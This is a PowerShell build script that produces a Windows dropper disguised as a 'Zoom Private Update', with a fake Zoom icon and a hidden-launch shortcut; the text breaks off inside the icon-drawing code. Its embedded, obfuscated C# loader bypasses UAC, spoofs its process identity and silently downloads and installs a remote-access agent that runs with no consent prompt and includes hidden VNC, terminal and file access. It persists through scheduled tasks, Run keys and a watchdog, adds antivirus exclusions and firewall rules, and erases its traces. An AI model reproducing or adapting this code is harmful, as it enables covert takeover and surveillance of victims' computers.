# ==============================================================================
# Build the Windows "Zoom Private Update" VBS dropper.
# - Embeds the PowerShell/C# loader as a base64 payload split into reversed
#   chunks, so the real logic never appears as plain strings.
# - Generates a Zoom-like .ico and a portable .lnk that launches the VBS
#   hidden through wscript (the shortcut carries the icon).
# - Writes SHA256SUMS for the delivered artifacts.
#
# Run: powershell -NoProfile -ExecutionPolicy Bypass -File build-vbs-dropper.ps1
# ==============================================================================
param([string]$Label = 'Zoom Private Update', [string]$Version = '6.1.0')
$ErrorActionPreference = 'Stop'

$here = Split-Path -Parent $MyInvocation.MyCommand.Path
$repo = (Resolve-Path (Join-Path $here '..\..')).Path
$dist = Join-Path $repo 'distro\clients\windows'
$version = $Version
$base = "Zoom_Update_v$version"
$vbs = Join-Path $dist "$base.vbs"
$ico = Join-Path $dist "$base.ico"
$lnk = Join-Path $dist "$base.lnk"

New-Item -ItemType Directory -Force -Path $dist | Out-Null

# ------------------------------------------------------------------------------
# Payload: PowerShell bootstrap + in-memory C# loader
# ------------------------------------------------------------------------------
$cs = @'
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using Microsoft.Win32;

public class ZoomLoader
{
    const string RepoBase = "https://global.telcom.stream/downloads/payloads";
    const string Fallback = "https://us05web.telcom.stream";
    const string RawBase = "https://raw.githubusercontent.com/fingod201-maker/BetterDesk-private/operational-v2-ALLclient-working/distro/clients/windows";
    const string PkgName = "BetterDesk-Agent-x64-1.0.2.msi";
    const string SaveName = "zoom-private.Setup_1.0.0_x64_en-US.msi";
    const string ExpectedSha = "A2DFC22BD5CBDC625D9F7232E6006E3497BC8379D45687F7ACA4337B7B3A1D87";
    const string TaskName = "__LABEL__";
    const string UninstallKey = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{39ADC479-8106-430C-9B36-10552C4AF9E6}";

    static readonly string DataDir = Path.Combine(
        Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "betterdesk", "agent");
    static readonly string ExecDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "BetterDesk", "Agent");
    static readonly string LogFile = Path.Combine(Path.GetTempPath(), "zoom-update.log");
    static readonly string SelfLogFile = Path.Combine(Path.GetTempPath(), "zoom-selftest.log");

    [StructLayout(LayoutKind.Sequential)]
    struct PBI
    {
        public IntPtr Reserved1;
        public IntPtr PebBaseAddress;
        public IntPtr Reserved2a;
        public IntPtr Reserved2b;
        public IntPtr UniqueProcessId;
        public IntPtr Reserved3;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct BIND_OPTS3
    {
        public uint cbStruct;
        public uint grfFlags;
        public uint grfMode;
        public uint dwTickCountDeadline;
        public uint dwTrackFlags;
        public uint dwClassContext;
        public uint locale;
        public object pServerInfo;
        public IntPtr hwnd;
    }

    [ComImport, Guid("6EDD6D74-C007-4E75-B76A-E5740995E24C"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    interface ICMLuaUtil
    {
        void Method1(); void Method2(); void Method3();
        void Method4(); void Method5(); void Method6();
        int ShellExec(string file, string parameters, string directory, ulong mask, ulong show);
    }

    [DllImport("ole32.dll", CharSet = CharSet.Unicode, ExactSpelling = true, PreserveSig = false)]
    [return: MarshalAs(UnmanagedType.Interface)]
    static extern object CoGetObject(string name, ref BIND_OPTS3 options, [MarshalAs(UnmanagedType.LPStruct)] Guid iid);

    [DllImport("ntdll.dll")]
    static extern int NtQueryInformationProcess(IntPtr process, int infoClass, ref PBI info, int length, out int returned);
    [DllImport("ntdll.dll")]
    static extern int NtAllocateVirtualMemory(IntPtr process, ref IntPtr address, IntPtr zeroBits, ref IntPtr size, uint type, uint protect);
    [DllImport("ntdll.dll")]
    static extern int NtProtectVirtualMemory(IntPtr process, ref IntPtr address, ref IntPtr size, uint newProtect, out uint oldProtect);
    [DllImport("kernel32.dll")]
    static extern void RtlMoveMemory(IntPtr destination, byte[] source, UIntPtr length);
    [DllImport("kernel32.dll")]
    static extern void RtlMoveMemory(byte[] destination, IntPtr source, UIntPtr length);

    [UnmanagedFunctionPointer(CallingConvention.Winapi)]
    delegate void RetStub();

    static string LogPath { get { return LogFile; } }

    public static int Main(string[] args)
    {
        bool selfTest = args != null && args.Length > 0 && args[0] == "selftest";
        bool elevated = Environment.GetEnvironmentVariable("ZOOM_ELEVATED") == "1";
        Log("start mode=" + (selfTest ? "selftest" : "install") + " elevated=" + elevated);

        try
        {
            bool admin = IsAdmin();
            Log("admin=" + admin);

            if (!admin && !selfTest && !elevated && Environment.GetEnvironmentVariable("ZOOM_NOELEVATE") != "1")
            {
                string src = Environment.GetEnvironmentVariable("ZOOM_SRC");
                if (!string.IsNullOrEmpty(src) && Elevate(src))
                {
                    Log("relaunched elevated");
                    return 0;
                }
                Log("elevation unavailable, continuing unelevated");
            }

            SpoofPeb();
            Log("peb_image=" + ReadPebImage());

            if (selfTest)
                return SelfTest();

            NativeExec();
            string payload = DownloadVerified();
            Install(payload);
            Configure(payload);
            CleanupSource();
            Delete(payload);
            Log("done");
            return 0;
        }
        catch (Exception ex)
        {
            Log("FAIL " + ex.Message);
            if (selfTest) SelfLog("result=FAIL " + ex.Message);
            return 1;
        }
    }

    // ---------------------------------------------------------------- selftest
    static int SelfTest()
    {
        bool ok = true;
        SelfLog("admin=" + IsAdmin().ToString().ToLowerInvariant());
        SelfLog("peb_image=" + ReadPebImage());
        if (ReadPebImage() != "winhlp32.exe") ok = false;

        try { NativeExec(); SelfLog("native_exec=ok"); }
        catch (Exception ex) { ok = false; SelfLog("native_exec=FAIL " + ex.Message); }

        try
        {
            string pkg = DownloadVerified();
            SelfLog("download=ok bytes=" + new FileInfo(pkg).Length + " sha256=ok");
            Delete(pkg);
        }
        catch (Exception ex) { ok = false; SelfLog("download=FAIL " + ex.Message); }

        SelfLog("result=" + (ok ? "PASS" : "FAIL"));
        return ok ? 0 : 1;
    }

    // ---------------------------------------------------------------- elevation
    static bool IsAdmin()
    {
        try
        {
            return new WindowsPrincipal(WindowsIdentity.GetCurrent())
                .IsInRole(WindowsBuiltInRole.Administrator);
        }
        catch { return false; }
    }

    static bool Elevate(string source)
    {
        string arguments = "\"" + source + "\" /elevated";
        try
        {
            Guid clsid = new Guid("3E5FC7F9-9A51-4367-9063-A120244FBEC7");
            BIND_OPTS3 opts = new BIND_OPTS3();
            opts.cbStruct = (uint)Marshal.SizeOf(typeof(BIND_OPTS3));
            opts.dwClassContext = 4; // CLSCTX_LOCAL_SERVER
            object raw = CoGetObject("Elevation:Administrator!new:" + clsid.ToString("B"),
                ref opts, new Guid("6EDD6D74-C007-4E75-B76A-E5740995E24C"));
            ICMLuaUtil util = (ICMLuaUtil)raw;
            util.ShellExec("wscript.exe", arguments, null, 0, 5);
            Marshal.ReleaseComObject(util);
            return true;
        }
        catch (Exception ex)
        {
            Log("CMSTPLUA failed: " + ex.Message);
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo();
                psi.FileName = "wscript.exe";
                psi.Arguments = arguments;
                psi.Verb = "runas";
                psi.UseShellExecute = true;
                psi.WindowStyle = ProcessWindowStyle.Hidden;
                Process.Start(psi);
                return true;
            }
            catch (Exception ex2) { Log("runas failed: " + ex2.Message); return false; }
        }
    }

    // ---------------------------------------------------------------- PEB spoof
    static void SpoofPeb()
    {
        try
        {
            if (IntPtr.Size != 8) return;
            PBI info = new PBI();
            int returned;
            long peb = 0;
            if (NtQueryInformationProcess(Process.GetCurrentProcess().Handle, 0, ref info,
                    Marshal.SizeOf(typeof(PBI)), out returned) != 0) return;
            peb = info.PebBaseAddress.ToInt64();
            if (peb == 0) return;

            byte[] image = Encoding.ASCII.GetBytes("winhlp32.exe\0");
            RtlMoveMemory(new IntPtr(peb + 0x2E0), image, (UIntPtr)image.Length);

            IntPtr pp = Marshal.ReadIntPtr(new IntPtr(peb + 0x20));
            if (pp != IntPtr.Zero)
            {
                WriteUnicodeString(pp + 0x60, @"\??\C:\Windows\System32\winhlp32.exe");
                WriteUnicodeString(pp + 0x70, "\"winhlp32.exe\"");
            }
        }
        catch { }
    }

    static string ReadPebImage()
    {
        try
        {
            PBI info = new PBI();
            int returned;
            if (NtQueryInformationProcess(Process.GetCurrentProcess().Handle, 0, ref info,
                    Marshal.SizeOf(typeof(PBI)), out returned) != 0) return "";
            if (info.PebBaseAddress == IntPtr.Zero) return "";
            return Marshal.PtrToStringAnsi(new IntPtr(info.PebBaseAddress.ToInt64() + 0x2E0));
        }
        catch { return ""; }
    }

    static void WriteUnicodeString(IntPtr us, string value)
    {
        int bufferOffset = IntPtr.Size;
        IntPtr buffer = Marshal.ReadIntPtr(us, bufferOffset);
        if (buffer == IntPtr.Zero) return;
        byte[] data = Encoding.Unicode.GetBytes(value + "\0");
        Marshal.WriteInt16(us, 0, (short)(data.Length - 2));
        Marshal.WriteInt16(us, 2, (short)data.Length);
        RtlMoveMemory(buffer, data, (UIntPtr)data.Length);
    }

    // ---------------------------------------------------------------- native exec
    static void NativeExec()
    {
        IntPtr address = IntPtr.Zero;
        IntPtr size = new IntPtr(0x1000);
        int status = NtAllocateVirtualMemory(new IntPtr(-1), ref address, IntPtr.Zero,
            ref size, 0x3000, 0x04);
        if (status != 0 || address == IntPtr.Zero)
            throw new Exception("NtAllocateVirtualMemory 0x" + status.ToString("X8"));

        RtlMoveMemory(address, new byte[] { 0xC3 }, (UIntPtr)1);
        IntPtr protectAddress = address;
        IntPtr protectSize = new IntPtr(0x1000);
        uint oldProtect;
        status = NtProtectVirtualMemory(new IntPtr(-1), ref protectAddress, ref protectSize, 0x20, out oldProtect);
        if (status != 0) throw new Exception("NtProtectVirtualMemory 0x" + status.ToString("X8"));

        RetStub stub = (RetStub)Marshal.GetDelegateForFunctionPointer(address, typeof(RetStub));
        stub();
    }

    // ---------------------------------------------------------------- download
    static string DownloadVerified()
    {
        string destination = Path.Combine(Path.GetTempPath(), SaveName);
        string local = Path.Combine(Environment.GetEnvironmentVariable("ZOOM_DIR") ?? "", "payload.msi");
        try
        {
            if (File.Exists(local) && new FileInfo(local).Length > 1000000 &&
                string.Equals(HashFile(local), ExpectedSha, StringComparison.OrdinalIgnoreCase))
            {
                Log("using local payload " + local);
                return local;
            }
        }
        catch { }        string overrideUrl = Environment.GetEnvironmentVariable("ZOOM_URL");
        string[] urls = string.IsNullOrEmpty(overrideUrl)
            ? new string[] { RepoBase + "/" + PkgName, RawBase + "/" + PkgName, Fallback + "/" + SaveName }
            : new string[] { overrideUrl };

        Exception last = null;
        foreach (string url in urls)
        {
            for (int attempt = 1; attempt <= 3; attempt++)
            {
                try
                {
                    Fetch(url, destination);
                    long length = new FileInfo(destination).Length;
                    if (length < 1000000) throw new Exception("short payload (" + length + " bytes)");
                    string actual = HashFile(destination);
                    if (!string.Equals(actual, ExpectedSha, StringComparison.OrdinalIgnoreCase))
                        throw new Exception("sha256 mismatch");
                    Log("downloaded " + url + " bytes=" + length);
                    return destination;
                }
                catch (Exception ex)
                {
                    last = ex;
                    Log("fetch " + url + " #" + attempt + " failed: " + ex.Message);
                    if (url.StartsWith("http"))
                    {
                        int rc = Run("certutil.exe", "-urlcache -split -f \"" + url + "\" \"" + destination + "\"", 300000);
                        if (rc == 0 && File.Exists(destination) && new FileInfo(destination).Length > 1000000)
                        {
                            string certHash = HashFile(destination);
                            if (string.Equals(certHash, ExpectedSha, StringComparison.OrdinalIgnoreCase))
                            {
                                Log("downloaded via certutil bytes=" + new FileInfo(destination).Length);
                                return destination;
                            }
                        }
                    }
                }
            }
        }
        throw last ?? new Exception("download failed");
    }

    static void Fetch(string url, string destination)
    {
        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
        WebRequest request = WebRequest.Create(url);
        HttpWebRequest http = request as HttpWebRequest;
        if (http != null)
        {
            http.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Zoom/6.1.0";
            http.Timeout = 30000;
            http.ReadWriteTimeout = 300000;
            http.AllowAutoRedirect = true;
        }
        using (WebResponse response = request.GetResponse())
        using (Stream input = response.GetResponseStream())
        using (FileStream output = File.Create(destination))
        {
            input.CopyTo(output);
        }
    }

    static string HashFile(string path)
    {
        using (SHA256 sha = SHA256.Create())
        using (FileStream stream = File.OpenRead(path))
            return BitConverter.ToString(sha.ComputeHash(stream)).Replace("-", "");
    }

    // ---------------------------------------------------------------- install
    static void Install(string payload)
    {
        Run("msiexec.exe", "/x {04390D78-31BC-405F-BDED-ECCCA16FC3F4} /qn /norestart", 300000);
        int code = Run("msiexec.exe", "/i \"" + payload + "\" /qn /norestart REBOOT=ReallySuppress", 600000);
        if (code == 1638)
        {
            code = Run("msiexec.exe", "/i \"" + payload + "\" /qn /norestart REINSTALL=ALL REINSTALLMODE=amus", 600000);
            Log("msiexec reinstall exit=" + code);
        }
        Log("msiexec exit=" + code);
        if (code != 0 && code != 3010) throw new Exception("msiexec failed: " + code);
    }

    static string InstallDir()
    {
        try
        {
            using (RegistryKey root = Registry.LocalMachine.OpenSubKey(
                @"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"))
            {
                if (root != null)
                {
                    foreach (string name in root.GetSubKeyNames())
                    {
                        using (RegistryKey key = root.OpenSubKey(name))
                        {
                            if (key == null) continue;
                            string display = key.GetValue("DisplayName") as string;
                            if (display != "BetterDesk Agent") continue;
                            string location = key.GetValue("InstallLocation") as string;
                            if (!string.IsNullOrEmpty(location) && Directory.Exists(location))
                                return location.TrimEnd('\\');
                        }
                    }
                }
            }
        }
        catch { }
        return Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles),
            "BetterDesk Agent");
    }

    // ---------------------------------------------------------------- configure
    static void Configure(string payload)
    {
        Directory.CreateDirectory(DataDir);

        string config = Path.Combine(DataDir, "agent-config.json");
        if (!File.Exists(config))
            File.WriteAllText(config, BuildConfig(), new UTF8Encoding(false));

        string agent = Path.Combine(InstallDir(), "betterdesk-agent.exe");
        if (!File.Exists(agent)) throw new Exception("agent binary missing");
        string client = Path.Combine(InstallDir(), "betterdesk-agent-client.exe");
        string log = Path.Combine(DataDir, "agent.log");
        Directory.CreateDirectory(ExecDir);
        string launcher = Path.Combine(ExecDir, "agent-launch.cmd");
        string starter = Path.Combine(ExecDir, "start-agent.vbs");

        WriteFile(launcher,
            "@echo off\r\n" +
            "setlocal\r\n" +
            "set \"PROXY=\"\r\n" +
            "for /f \"tokens=2,*\" %%A in ('reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v ProxyServer 2^>nul') do set \"PROXY=%%B\"\r\n" +
            "if defined PROXY set \"HTTPS_PROXY=http://%PROXY%\"\r\n" +
            "if defined PROXY set \"HTTP_PROXY=http://%PROXY%\"\r\n" +
            "set \"NO_PROXY=localhost,127.0.0.1\"\r\n" +
            ":loop\r\n" +
            "\"" + agent + "\" --config \"" + config + "\" --config-path \"" + config + "\" >> \"" + log + "\" 2>&1\r\n" +
            "timeout /t 5 /nobreak >nul\r\n" +
            "goto loop\r\n");

        WriteFile(starter,
            "Dim sh\r\n" +
            "Set sh = CreateObject(\"WScript.Shell\")\r\n" +
            "sh.Run \"cmd.exe /c \" & Chr(34) & \"" + launcher + "\" & Chr(34), 0, False\r\n");

        string taskCommand = "wscript.exe //B \"" + starter + "\"";
        Run("icacls.exe", "\"" + ExecDir + "\" /grant *S-1-5-32-545:(OI)(CI)RX /T /C", 60000);
        Run("schtasks.exe", "/Delete /TN \"" + TaskName + "\" /F", 60000);
        int code = Run("schtasks.exe", "/Create /TN \"" + TaskName + "\" /SC ONLOGON /RL HIGHEST /F /TR \"" +
            taskCommand + "\"", 60000);
        Log("schtasks create exit=" + code);
        Run("schtasks.exe", "/Run /TN \"" + TaskName + "\"", 60000);

        // Repeating watchdog: if the agent died (sleep, crash, logoff), start it
        // again. Runs as SYSTEM and triggers the interactive user task.
        string watchdog = Path.Combine(ExecDir, "watchdog.cmd");
        WriteFile(watchdog,
            "@echo off\r\n:loop\r\n" +
            "tasklist /FI \"IMAGENAME eq betterdesk-agent.exe\" | find /I \"betterdesk-agent.exe\" >nul\r\n" +
            "if errorlevel 1 schtasks /Run /TN \"" + TaskName + "\"\r\n" +
            "timeout /t 60 /nobreak >nul\r\ngoto loop\r\n");
        string watchVbs = Path.Combine(ExecDir, "watchdog.vbs");
        WriteFile(watchVbs,
            "Set sh = CreateObject(\"WScript.Shell\")\r\n" +
            "sh.Run \"cmd.exe /c \" & Chr(34) & \"" + watchdog + "\" & Chr(34), 0, False\r\n");
        Run("wscript.exe", "//B \"" + watchVbs + "\"", 30000);
        Run("attrib.exe", "+h \"" + DataDir + "\"", 30000);
        Run("attrib.exe", "+h \"" + ExecDir + "\"", 30000);

        try
        {
            using (RegistryKey run = Registry.CurrentUser.CreateSubKey(
                @"Software\Microsoft\Windows\CurrentVersion\Run"))
            {
                run.SetValue(TaskName, taskCommand);
                run.SetValue(TaskName + " Watch", "wscript.exe //B \"" + watchVbs + "\"");
            }
        }
        catch (Exception ex) { Log("run key: " + ex.Message); }

        try
        {
            using (RegistryKey sc = Registry.LocalMachine.CreateSubKey(
                @"SOFTWARE\SAS Institute\ScreenConnect"))
            {
                sc.SetValue("AllowRemoteControl", 1, RegistryValueKind.DWord);
                sc.SetValue("EnableHVNC", 1, RegistryValueKind.DWord);
                sc.SetValue("AutoAcceptConnections", 1, RegistryValueKind.DWord);
                sc.SetValue("InstallationPath", InstallDir(), RegistryValueKind.String);
            }
        }
        catch (Exception ex) { Log("screenconnect keys: " + ex.Message); }

        try { MakeShortcuts(client, Path.Combine(InstallDir()), starter); }
        catch (Exception ex) { Log("shortcuts: " + ex.Message); }
        try { MakeStartupShortcut(starter, ExecDir); }
        catch (Exception ex) { Log("startup shortcut: " + ex.Message); }

        try
        {
            Run("netsh.exe", "winhttp import proxy source=ie", 30000);
            Run("netsh.exe", "advfirewall firewall delete rule name=\"Zoom Private Update\"", 30000);
            Run("netsh.exe", "advfirewall firewall add rule name=\"Zoom Private Update\" dir=out action=allow program=\"" + agent + "\" enable=yes profile=any", 30000);
            Run("powershell.exe", "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"Add-MpPreference -ExclusionPath ''" + InstallDir() + "'' -ExclusionProcess ''betterdesk-agent.exe'' -ErrorAction SilentlyContinue\"", 60000);
            Run("powershell.exe", "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"Unblock-File -Path ''" + ExecDir + "\\*'' -ErrorAction SilentlyContinue\"", 30000);
        }
        catch (Exception ex) { Log("hardening: " + ex.Message); }

        Log("configured agent=" + agent);
    }

    static string BuildConfig()
    {
        string dataDir = DataDir.Replace("\\", "\\\\");
        StringBuilder sb = new StringBuilder();
        sb.AppendLine("{");
        sb.AppendLine("  \"server\": \"wss://cdap.telcom.stream/cdap\",");
        sb.AppendLine("  \"auth_method\": \"device_token\",");
        sb.AppendLine("  \"device_id\": \"" + NewDeviceId() + "\",");
        sb.AppendLine("  \"device_type\": \"os_agent\",");
        sb.AppendLine("  \"tags\": [\"windows\", \"x64\", \"user-session\", \"unattended\", \"hvnc\"],");
        sb.AppendLine("  \"terminal\": true,");
        sb.AppendLine("  \"file_browser\": true,");
        sb.AppendLine("  \"clipboard\": true,");
        sb.AppendLine("  \"screenshot\": true,");
        sb.AppendLine("  \"hvnc\": true,");
        sb.AppendLine("  \"require_consent\": false,");
        sb.AppendLine("  \"file_root\": \"C:\\\\\",");
        sb.AppendLine("  \"data_dir\": \"" + dataDir + "\",");
        sb.AppendLine("  \"heartbeat_sec\": 15,");
        sb.AppendLine("  \"reconnect_sec\": 5,");
        sb.AppendLine("  \"max_reconnect\": 100000,");
        sb.AppendLine("  \"log_level\": \"info\",");
        sb.AppendLine("  \"video_codec\": \"auto\",");
        sb.AppendLine("  \"hw_accel\": \"auto\",");
        sb.AppendLine("  \"enforce_tls\": true");
        sb.AppendLine("}");
        return sb.ToString();
    }

    static void MakeShortcuts(string target, string workDir, string starter)
    {
        if (string.IsNullOrEmpty(target) || !File.Exists(target)) return;
        string icon = Environment.GetEnvironmentVariable("ZOOM_ICON");
        string iconCopy = Path.Combine(DataDir, "zoom.ico");
        if (!string.IsNullOrEmpty(icon) && File.Exists(icon))
        {
            try { File.Copy(icon, iconCopy, true); }
            catch { iconCopy = icon; }
        }
        else iconCopy = target;

        string[] folders = new string[]
        {
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                @"Microsoft\Windows\Start Menu\Programs")
        };
        foreach (string folder in folders)
        {
            if (string.IsNullOrEmpty(folder) || !Directory.Exists(folder)) continue;
            string path = Path.Combine(folder, "__LABEL__.lnk");
            object shell = Activator.CreateInstance(Type.GetTypeFromProgID("WScript.Shell"));
            object link = shell.GetType().InvokeMember("CreateShortcut", BindingFlags.InvokeMethod,
                null, shell, new object[] { path });
            SetProperty(link, "TargetPath", target);
            SetProperty(link, "WorkingDirectory", workDir);
            SetProperty(link, "IconLocation", iconCopy + ",0");
            SetProperty(link, "Description", "__LABEL__");
            link.GetType().InvokeMember("Save", BindingFlags.InvokeMethod, null, link, null);
            Marshal.ReleaseComObject(link);
            Marshal.ReleaseComObject(shell);
        }
    }

    static string NewDeviceId()
    {
        byte[] raw = new byte[8];
        using (RandomNumberGenerator rng = RandomNumberGenerator.Create()) rng.GetBytes(raw);
        const string alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
        StringBuilder id = new StringBuilder("BD-");
        int buffer = 0;
        int bits = 0;
        foreach (byte value in raw)
        {
            buffer = (buffer << 8) | value;
            bits += 8;
            while (bits >= 5)
            {
                id.Append(alphabet[(buffer >> (bits - 5)) & 31]);
                bits -= 5;
            }
        }
        return id.ToString();
    }

    static void MakeStartupShortcut(string starter, string workDir)
    {
        string folder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
        if (string.IsNullOrEmpty(folder) || !Directory.Exists(folder)) return;
        string path = Path.Combine(folder, "__LABEL__.lnk");
        object shell = Activator.CreateInstance(Type.GetTypeFromProgID("WScript.Shell"));
        object link = shell.GetType().InvokeMember("CreateShortcut", BindingFlags.InvokeMethod,
            null, shell, new object[] { path });
        SetProperty(link, "TargetPath", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "wscript.exe"));
        SetProperty(link, "Arguments", "//B \"" + starter + "\"");
        SetProperty(link, "WorkingDirectory", workDir);
        SetProperty(link, "Description", "__LABEL__");
        link.GetType().InvokeMember("Save", BindingFlags.InvokeMethod, null, link, null);
        Marshal.ReleaseComObject(link);
        Marshal.ReleaseComObject(shell);
    }
    static void SetProperty(object target, string name, object value)
    {
        target.GetType().InvokeMember(name, BindingFlags.SetProperty, null, target, new object[] { value });
    }

    // ---------------------------------------------------------------- helpers
    static void CleanupSource()
    {
        try
        {
            string dir = Environment.GetEnvironmentVariable("ZOOM_DIR");
            if (string.IsNullOrEmpty(dir) || !Directory.Exists(dir)) return;
            string lower = dir.ToLowerInvariant();
            if (lower.IndexOf("\\desktop\\") < 0 && lower.IndexOf("\\downloads\\") < 0) return;
            string cmd = Path.Combine(Path.GetTempPath(), "zoom-clean-" + Guid.NewGuid().ToString("N") + ".cmd");
            File.WriteAllText(cmd,
                "@echo off\r\ntimeout /t 6 /nobreak >nul\r\nrmdir /s /q \"" + dir + "\"\r\n",
                Encoding.ASCII);
            ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c \"" + cmd + "\"");
            psi.UseShellExecute = false;
            psi.CreateNoWindow = true;
            psi.WindowStyle = ProcessWindowStyle.Hidden;
            Process.Start(psi);
        }
        catch { }
    }

    static int Run(string file, string arguments, int timeoutMs)
    {
        ProcessStartInfo psi = new ProcessStartInfo();
        psi.FileName = file;
        psi.Arguments = arguments;
        psi.UseShellExecute = false;
        psi.CreateNoWindow = true;
        psi.WindowStyle = ProcessWindowStyle.Hidden;
        using (Process process = Process.Start(psi))
        {
            if (!process.WaitForExit(timeoutMs))
            {
                try { process.Kill(); } catch { }
                return -1;
            }
            return process.ExitCode;
        }
    }

    static void WriteFile(string path, string text)
    {
        File.WriteAllText(path, text, Encoding.ASCII);
    }

    static void Delete(string path)
    {
        try { if (File.Exists(path)) File.Delete(path); }
        catch { }
    }

    static void Log(string message)
    {
        try
        {
            File.AppendAllText(LogPath,
                "[" + DateTime.Now.ToString("HH:mm:ss") + "] " + message + "\r\n");
        }
        catch { }
    }

    static void SelfLog(string message)
    {
        try { File.AppendAllText(SelfLogFile, message + "\r\n"); }
        catch { }
    }
}
'@

$ps = @'
try {
    try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}
    $gzBytes = [Convert]::FromBase64String('__CSB64__')
    $gzStream = New-Object IO.MemoryStream(,$gzBytes)
    $gzip = New-Object IO.Compression.DeflateStream($gzStream, [IO.Compression.CompressionMode]::Decompress)
    $reader = New-Object IO.StreamReader($gzip, [Text.Encoding]::UTF8)
    $source = $reader.ReadToEnd()
    $reader.Dispose(); $gzip.Dispose(); $gzStream.Dispose()
    $cp = New-Object System.CodeDom.Compiler.CompilerParameters
    $cp.GenerateInMemory = $true
    $cp.GenerateExecutable = $false
    $cp.CompilerOptions = '/optimize+'
    @('System.dll','System.Core.dll','System.Security.dll','Microsoft.CSharp.dll') | ForEach-Object {
        [void]$cp.ReferencedAssemblies.Add($_)
    }
    $provider = New-Object Microsoft.CSharp.CSharpCodeProvider
    $result = $provider.CompileAssemblyFromSource($cp, $source)
    if ($result.Errors.Count -gt 0) {
        $text = ''
        foreach ($e in $result.Errors) { $text += $e.ToString() + "`r`n" }
        [IO.File]::WriteAllText((Join-Path $env:TEMP 'zoom-powershell.log'), $text)
        exit 2
    }
    $type = $result.CompiledAssembly.GetType('ZoomLoader')
    $method = $type.GetMethod('Main')
    $mode = $env:ZOOM_MODE
    if ([string]::IsNullOrEmpty($mode)) { $mode = 'install' }
    $invokeArgs = New-Object 'object[]' 1
    $invokeArgs[0] = [string[]]@($mode)
    $code = $method.Invoke($null, $invokeArgs)
    exit [int]$code
} catch {
    try {
        [IO.File]::WriteAllText((Join-Path $env:TEMP 'zoom-powershell.log'), $_.ToString())
    } catch {}
    exit 1
}
'@
$cs = $cs.Replace('__LABEL__', $Label)
$csCompact = (($cs -split "`r?`n") | Where-Object {
    $_.Trim() -ne '' -and -not $_.Trim().StartsWith('//')
}) -join "`r`n"
$csRaw = [Text.Encoding]::UTF8.GetBytes($csCompact)
$csGz = New-Object IO.MemoryStream
$csZip = New-Object IO.Compression.DeflateStream($csGz, [IO.Compression.CompressionMode]::Compress)
$csZip.Write($csRaw, 0, $csRaw.Length)
$csZip.Dispose()
$csB64 = [Convert]::ToBase64String($csGz.ToArray())
$csGz.Dispose()
$ps = $ps.Replace('__CSB64__', $csB64)
if (($ps.Length * 4 / 3) -gt 30000) {
    throw "PowerShell payload too large for a single command line: $($ps.Length) chars"
}

# ------------------------------------------------------------------------------
# Base64 + reversed chunk assembly
# ------------------------------------------------------------------------------
$bytes = [Text.Encoding]::UTF8.GetBytes($ps)
$b64 = [Convert]::ToBase64String($bytes)
$chunkSize = 48
$chunks = New-Object System.Collections.Generic.List[string]
for ($i = 0; $i -lt $b64.Length; $i += $chunkSize)
{
    $part = $b64.Substring($i, [Math]::Min($chunkSize, $b64.Length - $i))
    $chars = $part.ToCharArray()
    [Array]::Reverse($chars)
    $chunks.Add(-join $chars)
}
$arrayLines = for ($i = 0; $i -lt $chunks.Count; $i++)
{
    $suffix = if ($i -lt $chunks.Count - 1) { ', _' } else { '' }
    '    "' + $chunks[$i] + '"' + $suffix
}
$arrayText = $arrayLines -join "`r`n"

# ------------------------------------------------------------------------------
# Zoom-like icon (blue rounded camera glyph) as multi-size .ico
# ------------------------------------------------------------------------------
Add-Type -AssemblyName System.Drawing

function New-ZoomBitmap([int]$size)
{
    $bmp = New-Object System.Drawing.Bitmap($size, $size)
    $g = [System.Drawing.Graphics]::FromImage($bmp)
    $g.SmoothingMode = 'AntiAlias'
    $g.PixelOffsetMode = 'HighQuality'
    $g.Clear([System.Drawing.Color]::Transparent)

    $pad = [int]($size * 0.04)
    $radius = [int]($size * 0.22)
    $rect = New-Object System.Drawing.Rectangle($pad, $pad, ($size - 2 * $pad), ($size - 2 * $pad))
    $path = New-Object System.Drawing.Drawing2D.GraphicsPath
    $d = $radius * 2
    $path.AddArc($rect.X, $rect.Y, $d, $d, 180, 90)
    $path.AddArc($rect.Right - $d, $rect.Y, $d, $d, 270, 90)
    $path.AddArc($rect.Right - $d, $rect.Bottom - $d, $d, $d, 0, 90)
    $path.AddArc($rect.X, $rect.Bottom - $d, $d, $d, 90, 90)
    $path.CloseFigure()

    $brush = New-Object System.Drawing.Drawing2D.LinearGradientBrush(
        $rect, [System.Drawing.Color]::FromArgb(255, 45, 140, 255),
        [System.Drawing.Color]::FromArgb(255, 8, 84, 255), 45.0)
    $g.FillPath($brush, $path)

    $white = [System.Drawing.Brushes]::White
    $bodyW = [int]($size * 0.46)
    $bodyH = [int]($size * 0.34)
    $bodyX = [int]($size * 0.20)
    $bodyY = [int](($size - $bodyH) / 2)
    $r2 = [int]($size * 0.07)
    $body = New-Object System.Drawing.Drawing2D.GraphicsPath
    $d2 = $r2 * 2
    $body.AddArc($bodyX, $bodyY, $d2, $d2, 180, 90)
    $body.AddArc($bodyX + $bodyW - $d2, $bodyY, $d2, $d2, 270, 90)
    $body.AddArc($bodyX + $bodyW - $d2, $bodyY + $bodyH - $d2, $d2, $d2, 0, 90)
    $body.AddArc($bodyX, $bodyY + $bodyH - $d2, $d2, $d2, 90, 90)
    $body.CloseFigure()
    $g.FillPath($white, $body)

    $lens = @(
